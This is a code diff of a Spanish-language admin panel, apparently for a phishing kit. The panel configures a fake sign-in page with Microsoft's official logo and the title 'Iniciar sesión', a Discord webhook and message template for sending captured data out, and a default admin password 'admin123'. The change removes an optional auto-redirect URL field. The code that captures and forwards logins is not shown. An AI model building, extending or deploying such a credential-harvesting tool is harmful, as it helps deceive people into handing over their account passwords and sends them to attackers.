@@ -430,13 +430,6 @@
           <label for="loginDescription">Descripción (opcional)</label>
           <input type="text" id="loginDescription" placeholder="Ingrese una descripción opcional para la página de login">
         </div>
-        <div class="form-group">
-          <label for="redirectUrl">Redirección automática (opcional)</label>
-          <input type="url" id="redirectUrl" placeholder="https://ejemplo.com/pagina">
-          <div class="preview-box" style="font-size: 11px; color: #9a6700;">
-            Al abrir el login, redirige automáticamente a este link. Déjalo vacío para desactivar.
-          </div>
-        </div>
         <div class="preview-box" id="preview-content">
           <img id="logoPreview" src="https://aadcdn.msauth.net/shared/1.0/content/images/microsoft_logo_564db913a7fa0ca42727161c6d031bef.svg" style="height: 32px; display: none;">
           <div id="titlePreview" style="color: #fff; font-size: 16px; margin-top: 8px;"></div>
@@ -537,7 +530,6 @@
       document.getElementById('loginLogo').value = config.loginLogo || '';
       document.getElementById('loginTitle').value = config.loginTitle || 'Iniciar sesión';
       document.getElementById('loginDescription').value = config.loginDescription || '';
-      document.getElementById('redirectUrl').value = config.redirectUrl || '';
       document.getElementById('discordWebhook').value = config.discordWebhook || '';
       document.getElementById('discordMessageTemplate').value = config.discordMessageTemplate || '';
       document.getElementById('adminPassword').value = config.adminPassword || 'admin123';
@@ -619,7 +611,6 @@
         loginLogo: document.getElementById('loginLogo').value,
         loginTitle: document.getElementById('loginTitle').value,
         loginDescription: document.getElementById('loginDescription').value,
-        redirectUrl: document.getElementById('redirectUrl').value,
         discordWebhook: document.getElementById('discordWebhook').value,
         discordMessageTemplate: document.getElementById('discordMessageTemplate').value,
         adminPassword: document.getElementById('adminPassword').value,
